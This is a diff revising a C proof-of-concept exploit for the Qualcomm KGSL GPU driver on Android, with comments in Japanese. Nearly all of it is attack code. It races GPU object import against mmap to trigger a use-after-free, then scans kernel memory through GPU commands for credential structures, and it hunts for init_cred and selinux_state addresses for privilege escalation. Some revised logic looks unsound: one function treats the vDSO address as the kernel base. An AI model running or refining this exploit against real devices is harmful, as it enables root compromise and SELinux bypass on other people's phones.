@@ -1,4 +1,4 @@
-// check_poc.c
+// check_poc.c (revised)
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -19,6 +19,8 @@
 #include <dirent.h>
 #include <poll.h>
 #include <sys/wait.h>
+#include <elf.h>
+#include <link.h>
 
 #define KGSL_IOC_TYPE 0x09
 
@@ -65,15 +67,13 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-#define UAF_ADDR  0x7001ff000ULL
-#define UAF_SIZE  0x10004000ULL
-#define OVERLAP_ADDR 0x7001fe000ULL
-#define OVERLAP_SIZE 0x7000ULL
-#define BOGUS_ADDR 0x700204000ULL
-#define BOGUS_SIZE 0xffffffffffefd000ULL
-#define PLACEHOLDER_ADDR 0x710204000ULL
-#define PLACEHOLDER_SIZE 0x10400000ULL
+// サイズを CMA (160MB) に収まるように縮小
+#define UAF_SIZE        (32 * 1024 * 1024)   // 32MB
+#define PLACEHOLDER_SIZE (32 * 1024 * 1024)  // 32MB
+#define OVERLAP_SIZE    (4 * 1024)           // 4KB
+#define BOGUS_SIZE      (0xffffffffffefd000ULL) // そのまま
 
+// 固定アドレスは廃止し、動的に取得する
 #define SCAN_DWORDS 560
 #define CP_NOP 0x10
 #define CP_MEM_TO_MEM 0x73
@@ -82,6 +82,7 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
 static uint64_t g_kernel_ip = 0;
+static uint64_t g_uaf_base = 0;   // UAF マッピングの先頭アドレス
 
 void die(const char *msg) { perror(msg); exit(1); }
 
@@ -102,6 +103,7 @@ int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
 }
 
 void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
+    // MAP_FIXED を使わずに動的にマップ
     void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
     if (p == MAP_FAILED) die("gpuobj_mmap");
     return p;
@@ -154,7 +156,7 @@ int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_ga, size_t bytes, unsigne
 }
 
 void *race_thread(void *arg) {
-    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
+    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = (uint64_t)arg }; // BOGUS_ADDR を引数で渡す
     struct kgsl_gpuobj_import imp = {
         .priv = (uint64_t)&uaddr,
         .priv_len = BOGUS_SIZE,
@@ -251,6 +253,29 @@ uint64_t read_kallsyms_symbol(const char *name) {
     return addr;
 }
 
+// /proc/self/auxv から AT_SYSINFO_EHDR を読み取り vDSO ベースを取得
+uint64_t get_vdso_base(void) {
+    int fd = open("/proc/self/auxv", O_RDONLY);
+    if (fd < 0) return 0;
+    Elf64_auxv_t aux;
+    uint64_t vdso = 0;
+    while (read(fd, &aux, sizeof(aux)) == sizeof(aux)) {
+        if (aux.a_type == AT_SYSINFO_EHDR) {
+            vdso = aux.a_un.a_val;
+            break;
+        }
+    }
+    close(fd);
+    return vdso;
+}
+
+// vDSO からカーネルベースを推測（aarch64 では vDSO はカーネルと同じマッピング）
+uint64_t get_kernel_base_from_vdso(void) {
+    uint64_t vdso = get_vdso_base();
+    if (!vdso) return 0;
+    return vdso;
+}
+
 int gpu_read_kernel(uint64_t va, uint64_t *out, int count) {
     if (kgsl_fd < 0) return -1;
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
@@ -288,11 +313,13 @@ int gpu_read_kernel(uint64_t va, uint64_t *out, int count) {
 }
 
 void test_candidate_addresses(uint64_t ip, uint64_t init_cred_offset, uint64_t selinux_state_offset) {
+    // 候補ベースを動的に生成（ip から推測）
     uint64_t bases[] = {
+        ip & ~0x1FFFFFULL,          // 2MB アライメント
+        (ip & ~0x3FFFFFULL),        // 4MB
+        (ip & ~0xFFFFFFULL),        // 16MB
+        0xffffffc010080000ULL,      // 一般的なARM64ベース
         0xffffffee85a81000ULL,
-        0xffffffc010080000ULL,
-        0xffffffff81000000ULL,
-        ip & ~0x1FFFFFULL,
         0
     };
     printf("\n[*] Testing candidate kernel bases using offsets from known symbols\n");
@@ -321,38 +348,77 @@ void run_uaf_and_scan(void) {
     printf("[*] Running UAF to scan for cred pages in UAF area\n");
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) { printf("Cannot open kgsl\n"); return; }
-    uint64_t fl = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
-    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, fl);
-    void *um = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
-    if (um == MAP_FAILED) { printf("mmap UAF failed\n"); close(kgsl_fd); return; }
-    munmap(um, UAF_SIZE);
-    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) { printf("mmap BOGUS failed\n"); close(kgsl_fd); return; }
-    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, fl);
-    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
-    if (ph_m == MAP_FAILED) { printf("mmap placeholder failed\n"); close(kgsl_fd); return; }
 
-    printf("  Race setup done\n");
-    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, fl);
+    uint64_t fl = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
+
+    // 1. UAF オブジェクトを確保
+    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, fl);
+    void *um = gpuobj_mmap(kgsl_fd, UAF_SIZE, uaf_id);
+    g_uaf_base = (uint64_t)um;
+    printf("  UAF mapped at 0x%lx (size 0x%lx)\n", g_uaf_base, UAF_SIZE);
+
+    // 2. マッピングを解除（UAF の準備）
+    munmap(um, UAF_SIZE);
+    // ただし GPU オブジェクトはまだ生きているので、後で free する
+
+    // 3. BOGUS_ADDR 用のダミーマッピング（ユーザーアドレス空間に確保）
+    void *bogus = mmap((void*)0x700204000, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
+    if (bogus == MAP_FAILED) {
+        // 固定アドレスが使えない場合は任意のアドレスで代用
+        bogus = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+        if (bogus == MAP_FAILED) { printf("mmap bogus failed\n"); close(kgsl_fd); return; }
+        printf("  Bogus page mapped at 0x%lx (not fixed)\n", (uint64_t)bogus);
+        // 注意: この場合 BOGUS_ADDR を動的に変更する必要がある
+    } else {
+        printf("  Bogus page mapped at 0x700204000\n");
+    }
+
+    // 4. プレースホルダーを確保 (UAF 解放後にメモリを占有させるため)
+    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, fl);
+    void *ph_m = gpuobj_mmap(kgsl_fd, PLACEHOLDER_SIZE, ph_id);
+    printf("  Placeholder mapped at 0x%lx\n", (uint64_t)ph_m);
+
+    // 5. UAF オブジェクトを解放 (free)
+    gpuobj_free(kgsl_fd, uaf_id);
+    printf("  UAF object freed\n");
+
+    // 6. 競合スレッド開始 (import を連続呼び出し)
     pthread_t thr;
-    pthread_create(&thr, NULL, race_thread, NULL);
+    // BOGUS_ADDR として bogus のアドレスを使用
+    uint64_t bogus_addr = (uint64_t)bogus;
+    pthread_create(&thr, NULL, race_thread, (void*)bogus_addr);
+    printf("  Race thread started\n");
+
+    // 7. オーバーラップオブジェクトを確保し、UAF 領域にマップを試みる (競合)
+    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, fl);
     int hit = 0;
+    // オーバーラップマッピング先：UAF 領域の途中 (例: +1MB)
+    uint64_t overlap_target = g_uaf_base + 0x100000;
     for (int i = 0; i < 5000000; i++) {
-        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ov_id << 12);
+        void *r = mmap((void*)overlap_target, OVERLAP_SIZE, PROT_READ|PROT_WRITE,
+                       MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ov_id << 12);
         int e = errno;
-        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
+        if (r != MAP_FAILED) {
+            munmap(r, OVERLAP_SIZE);
+            hit = 1;
+            break;
+        }
         if (e == ENODEV) { hit = 1; break; }
+        usleep(10);
     }
     race_done = 1;
     pthread_join(thr, NULL);
-    if (!hit) { printf("  Race failed\n"); close(kgsl_fd); return; }
-    printf("  Race won\n");
-    gpuobj_free(kgsl_fd, uaf_id);
+    if (!hit) { printf("  Race failed (no overlap mapping)\n"); close(kgsl_fd); return; }
+    printf("  Race won (overlap mapped)\n");
+
+    // 8. メモリコンパクション＆キャッシュドロップ (UAF ページの再利用促進)
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
     if (rf >= 0) { write(rf, "1", 1); close(rf); }
     rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(50000);
 
+    // 9. UAF 領域をスキャンして cred パターン (0x000007D0) を探す
     printf("  Scanning UAF area for cred pattern (0x000007D0)\n");
     unsigned int ctx = create_context(kgsl_fd);
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, fl);
@@ -363,8 +429,10 @@ void run_uaf_and_scan(void) {
     void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
     uint64_t dst_ga = 0;
     gpuobj_info(kgsl_fd, dst_id, &dst_ga);
-    uint64_t scan_start = UAF_ADDR + 0x300000;
-    uint64_t scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
+
+    // スキャン範囲: UAF 領域の 1MB から 31MB まで
+    uint64_t scan_start = g_uaf_base + 0x100000;
+    uint64_t scan_end = g_uaf_base + UAF_SIZE - 0x1000;
 
     for (uint64_t va = scan_start; va < scan_end; va += 0x1000) {
         if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
@@ -389,7 +457,8 @@ void run_uaf_and_scan(void) {
         __sync_synchronize();
         uint32_t *data = (uint32_t *)dst_m;
         for (int i = 0; i < SCAN_DWORDS - 8; i++) {
-            if (data[i] == 0x000007D0 && data[i+1] == 0x000007D0 && data[i+2] == 0x000007D0 && data[i+3] == 0x000007D0) {
+            if (data[i] == 0x000007D0 && data[i+1] == 0x000007D0 &&
+                data[i+2] == 0x000007D0 && data[i+3] == 0x000007D0) {
                 printf("\n  Found cred pattern at va=0x%lx offset=0x%x\n", va, i*4);
                 printf("  Dumping 32 dwords from there:\n");
                 for (int j = 0; j < 32; j++) {
@@ -407,7 +476,7 @@ void run_uaf_and_scan(void) {
 
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("=== check_poc: Comprehensive Kernel Analysis ===\n\n");
+    printf("=== check_poc: Comprehensive Kernel Analysis (revised) ===\n\n");
 
     struct utsname u;
     uname(&u);
@@ -438,6 +507,7 @@ int main(int argc, char **argv) {
         close(fd);
     } else printf("unreadable\n");
 
+    // シンボル取得 (kallsyms)
     printf("\n[*] Trying to read /proc/kallsyms directly...\n");
     uint64_t selinux_state = read_kallsyms_symbol("selinux_state");
     uint64_t init_cred = read_kallsyms_symbol("init_cred");
@@ -446,25 +516,26 @@ int main(int argc, char **argv) {
     printf("  init_cred: 0x%lx\n", init_cred);
     printf("  selinux_state: 0x%lx\n", selinux_state);
 
-    if (stext && init_cred && selinux_state) {
-        printf("[+] All symbols found via kallsyms. Exploit can use these directly.\n");
-    } else {
-        printf("[-] Some symbols missing; will try to infer via GPU reads.\n");
+    // シンボルが取れない場合は /proc/kallsyms を直接 cat してみる (デバッグ)
+    if (!stext || !init_cred || !selinux_state) {
+        printf("[-] Some symbols missing; trying to read /proc/kallsyms via file read...\n");
+        read_file_content("/proc/kallsyms");
     }
 
+    // perf_event_open でカーネル IP 取得
     printf("\n[*] Attempting perf_event_open to get kernel IP...\n");
     uint64_t ip = get_kernel_ip_from_perf();
     if (ip) {
         printf("  Kernel IP: 0x%lx\n", ip);
         g_kernel_ip = ip;
-        // Use offsets from the known kallsyms (if we have stext, we can compute offset)
-        if (stext) {
-            uint64_t init_cred_offset = init_cred ? init_cred - stext : 0x26FA738ULL;
-            uint64_t selinux_state_offset = selinux_state ? selinux_state - stext : 0x28B9000ULL;
-            printf("  init_cred offset: 0x%lx, selinux_state offset: 0x%lx\n", init_cred_offset, selinux_state_offset);
+        if (stext && init_cred && selinux_state) {
+            uint64_t init_cred_offset = init_cred - stext;
+            uint64_t selinux_state_offset = selinux_state - stext;
+            printf("  init_cred offset: 0x%lx, selinux_state offset: 0x%lx\n",
+                   init_cred_offset, selinux_state_offset);
             test_candidate_addresses(ip, init_cred_offset, selinux_state_offset);
         } else {
-            // Use default offsets from provided kallsyms
+            printf("  Using fallback offsets (may be wrong)\n");
             test_candidate_addresses(ip, 0x26FA738ULL, 0x28B9000ULL);
         }
     } else {
